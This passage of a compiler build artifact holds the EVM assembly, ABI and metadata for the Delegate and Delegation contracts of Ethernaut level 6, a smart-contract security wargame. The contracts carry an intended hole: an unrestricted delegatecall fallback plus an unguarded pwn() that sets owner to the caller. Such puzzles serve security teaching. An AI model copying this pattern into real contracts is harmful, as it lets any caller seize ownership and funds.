									"end": 229,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 60,
									"end": 229,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 229,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220e69e9bbb39c236b64633331cbda11c5868a4c70a7a30c6846bcaf62d337bad8f64736f6c63430008110033",
									".code": [
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH",
											"source": 0,
											"value": "8DA5CB5B"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH",
											"source": 0,
											"value": "DD365B8B"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 229,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 229,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 85,
											"end": 105,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 85,
											"end": 105,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 173,
											"end": 226,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 173,
											"end": 226,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 173,
											"end": 226,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 173,
											"end": 226,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 173,
											"end": 226,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 173,
											"end": 226,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 173,
											"end": 226,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 173,
											"end": 226,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 85,
											"end": 105,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 85,
											"end": 105,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 173,
											"end": 226,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 173,
											"end": 226,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 210,
											"end": 220,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 202,
											"end": 207,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 202,
											"end": 207,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 202,
											"end": 220,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 202,
											"end": 220,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 202,
											"end": 220,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 202,
											"end": 220,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 173,
											"end": 226,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7,
											"end": 133,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 7,
											"end": 133,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 126,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 77,
											"end": 82,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 73,
											"end": 127,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 139,
											"end": 235,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 176,
											"end": 183,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 223,
											"end": 228,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 205,
											"end": 229,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 241,
											"end": 359,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 346,
											"end": 351,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 328,
											"end": 352,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 328,
											"end": 352,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 323,
											"end": 326,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 316,
											"end": 353,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 365,
											"end": 587,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 458,
											"end": 462,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 496,
											"end": 498,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 485,
											"end": 494,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 481,
											"end": 499,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 577,
											"end": 578,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 566,
											"end": 575,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 562,
											"end": 579,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 553,
											"end": 559,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 509,
											"end": 580,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 509,
											"end": 580,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"contracts/Ethernaut/06-Delegate.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"owner()": "8da5cb5b",
							"pwn()": "dd365b8b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pwn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Ethernaut/06-Delegate.sol\":\"Delegate\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ethernaut/06-Delegate.sol\":{\"keccak256\":\"0xc7c545e38d49799d771c6687b2f662b5d7ff0b3baa0e3111561e007b7a96cde4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b0a7a745245851f7c88079ba9ab2eecf5439b521d424e2131e2ea059528a3a71\",\"dweb:/ipfs/QmUNN87Y5gKDykUpSH1kBjkguPUZ8eGYzKA1WrrUXaJuaU\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "contracts/Ethernaut/06-Delegate.sol:Delegate",
								"label": "owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"Delegation": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_delegateAddress",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"stateMutability": "nonpayable",
							"type": "fallback"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Ethernaut/06-Delegate.sol\":233:560  contract Delegation {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Ethernaut/06-Delegate.sol\":309:422  constructor(address _delegateAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Ethernaut/06-Delegate.sol\":374:390  _delegateAddress */\n  dup1\n    /* \"contracts/Ethernaut/06-Delegate.sol\":354:362  delegate */\n  0x01\n  0x00\n    /* \"contracts/Ethernaut/06-Delegate.sol\":354:391  delegate = Delegate(_delegateAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ethernaut/06-Delegate.sol\":406:416  msg.sender */\n  caller\n    /* \"contracts/Ethernaut/06-Delegate.sol\":398:403  owner */\n  0x00\n  dup1\n    /* \"contracts/Ethernaut/06-Delegate.sol\":398:416  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ethernaut/06-Delegate.sol\":309:422  constructor(address _delegateAddress) {... */\n  pop\n    /* \"contracts/Ethernaut/06-Delegate.sol\":233:560  contract Delegation {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Ethernaut/06-Delegate.sol\":233:560  contract Delegation {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ethernaut/06-Delegate.sol\":233:560  contract Delegation {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      eq\n      tag_4\n      jumpi\n      jump(tag_3)\n    tag_2:\n    tag_3:\n        /* \"contracts/Ethernaut/06-Delegate.sol\":456:467  bool result */\n      0x00\n        /* \"contracts/Ethernaut/06-Delegate.sol\":480:488  delegate */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/06-Delegate.sol\":472:502  address(delegate).delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/06-Delegate.sol\":503:511  msg.data */\n      0x00\n      calldatasize\n        /* \"contracts/Ethernaut/06-Delegate.sol\":472:512  address(delegate).delegatecall(msg.data) */\n      mload(0x40)\n      tag_7\n      swap3\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      gas\n      delegatecall\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_11\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_10)\n    tag_11:\n      0x60\n      swap2\n      pop\n    tag_10:\n      stop\n        /* \"contracts/Ethernaut/06-Delegate.sol\":260:280  address public owner */\n    tag_4:\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_14:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:154   */\n    tag_17:\n        /* \"#utility.yul\":108:119   */\n      0x00\n        /* \"#utility.yul\":145:148   */\n      dup2\n        /* \"#utility.yul\":130:148   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:154   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":160:306   */\n    tag_18:\n        /* \"#utility.yul\":257:263   */\n      dup3\n        /* \"#utility.yul\":252:255   */\n      dup2\n        /* \"#utility.yul\":247:250   */\n      dup4\n        /* \"#utility.yul\":234:264   */\n      calldatacopy\n        /* \"#utility.yul\":298:299   */\n      0x00\n        /* \"#utility.yul\":289:295   */\n      dup4\n        /* \"#utility.yul\":284:287   */\n      dup4\n        /* \"#utility.yul\":280:296   */\n      add\n        /* \"#utility.yul\":273:300   */\n      mstore\n        /* \"#utility.yul\":160:306   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":334:661   */\n    tag_19:\n        /* \"#utility.yul\":448:451   */\n      0x00\n        /* \"#utility.yul\":469:557   */\n      tag_27\n        /* \"#utility.yul\":550:556   */\n      dup4\n        /* \"#utility.yul\":545:548   */\n      dup6\n        /* \"#utility.yul\":469:557   */\n      tag_17\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":462:557   */\n      swap4\n      pop\n        /* \"#utility.yul\":567:623   */\n      tag_28\n        /* \"#utility.yul\":616:622   */\n      dup4\n        /* \"#utility.yul\":611:614   */\n      dup6\n        /* \"#utility.yul\":604:609   */\n      dup5\n        /* \"#utility.yul\":567:623   */\n      tag_18\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":648:654   */\n      dup3\n        /* \"#utility.yul\":643:646   */\n      dup5\n        /* \"#utility.yul\":639:655   */\n      add\n        /* \"#utility.yul\":632:655   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:661   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":667:958   */\n    tag_8:\n        /* \"#utility.yul\":807:810   */\n      0x00\n        /* \"#utility.yul\":829:932   */\n      tag_30\n        /* \"#utility.yul\":928:931   */\n      dup3\n        /* \"#utility.yul\":919:925   */\n      dup5\n        /* \"#utility.yul\":911:917   */\n      dup7\n        /* \"#utility.yul\":829:932   */\n      tag_19\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":822:932   */\n      swap2\n      pop\n        /* \"#utility.yul\":949:952   */\n      dup2\n        /* \"#utility.yul\":942:952   */\n      swap1\n      pop\n        /* \"#utility.yul\":667:958   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":964:1090   */\n    tag_20:\n        /* \"#utility.yul\":1001:1008   */\n      0x00\n        /* \"#utility.yul\":1041:1083   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1034:1039   */\n      dup3\n        /* \"#utility.yul\":1030:1084   */\n      and\n        /* \"#utility.yul\":1019:1084   */\n      swap1\n      pop\n        /* \"#utility.yul\":964:1090   */\n      